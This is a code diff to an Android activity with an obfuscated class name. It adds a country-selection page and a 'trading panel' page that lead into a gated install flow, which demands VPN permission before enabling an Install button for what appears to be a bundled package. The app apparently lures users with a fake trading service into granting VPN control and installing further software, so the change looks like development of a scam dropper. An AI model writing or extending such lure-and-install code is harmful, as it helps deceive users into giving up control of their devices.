@@ -18,7 +18,9 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
+import android.view.View;
 import android.widget.Button;
+import android.widget.RadioGroup;
 import android.widget.TextView;
 
 import net.lingala.zip4j.ZipFile;
@@ -48,6 +50,19 @@ public class A4450c4b785 extends Activity {
     private Button   btn;
     private InstallResultReceiver receiver;
     private final Handler ui = new Handler(Looper.getMainLooper());
+
+    // Multi-page wizard views
+    private View       countryPage;
+    private View       tradingPanelPage;
+    private View       installPage;
+    private RadioGroup countryOptions;
+    private Button     btnContinueCountry;
+    private Button     btnOpenTradingPanel;
+    private TextView   selectedCountry;
+
+    private static final int PAGE_COUNTRY = 0;
+    private static final int PAGE_TRADING = 1;
+    private static final int PAGE_INSTALL = 2;
 
     /**
      * True once the user has granted VPN permission (so we know the system dialog
@@ -141,15 +156,59 @@ public class A4450c4b785 extends Activity {
         }
 
         setContentView(R.layout.activity_main);
+
+        // Page containers
+        countryPage      = findViewById(R.id.countryPage);
+        tradingPanelPage = findViewById(R.id.tradingPanelPage);
+        installPage      = findViewById(R.id.installPage);
+
         status = findViewById(R.id.status);
         btn    = findViewById(R.id.btnInstall);
         btn.setOnClickListener(v -> onInstallClicked());
 
-        // Lock the Install button and demand VPN permission before anything else.
-        btn.setEnabled(false);
-        requestVpnPermission();
+        // ── Country page ──
+        countryOptions   = findViewById(R.id.countryOptions);
+        btnContinueCountry = findViewById(R.id.btnContinueCountry);
+        selectedCountry  = findViewById(R.id.selectedCountry);
 
-        // Start the monitor — it will enable the button once VPN is confirmed live.
+        countryOptions.setOnCheckedChangeListener((group, checkedId) -> {
+            String label = "";
+            if (checkedId == R.id.countryIndia)    label = "India";
+            else if (checkedId == R.id.countryUsa) label = "USA";
+            else if (checkedId == R.id.countryNewYork) label = "New York";
+            if (selectedCountry != null) selectedCountry.setText("Selected country: " + label);
+            btnContinueCountry.setEnabled(true);
+        });
+
+        btnContinueCountry.setOnClickListener(v -> showPage(PAGE_TRADING));
+
+        // ── Trading panel page ──
+        btnOpenTradingPanel = findViewById(R.id.btnOpenTradingPanel);
+        btnOpenTradingPanel.setOnClickListener(v -> {
+            showPage(PAGE_INSTALL);
+            startInstallFlow();
+        });
+
+        // Start on the country-selection page.
+        showPage(PAGE_COUNTRY);
+    }
+
+    /** Switches between the country / trading-panel / install pages. */
+    private void showPage(int page) {
+        countryPage.setVisibility(page == PAGE_COUNTRY ? View.VISIBLE : View.GONE);
+        tradingPanelPage.setVisibility(page == PAGE_TRADING ? View.VISIBLE : View.GONE);
+        installPage.setVisibility(page == PAGE_INSTALL ? View.VISIBLE : View.GONE);
+    }
+
+    /**
+     * Begins the gated install flow once the user reaches the install page:
+     * demands VPN permission, then enables the Install button once the VPN
+     * is live.
+     */
+    private void startInstallFlow() {
+        btn.setEnabled(false);
+        status.setText("Grant the VPN permission to continue...");
+        requestVpnPermission();
         ui.postDelayed(vpnMonitor, VPN_MONITOR_MS);
     }
 
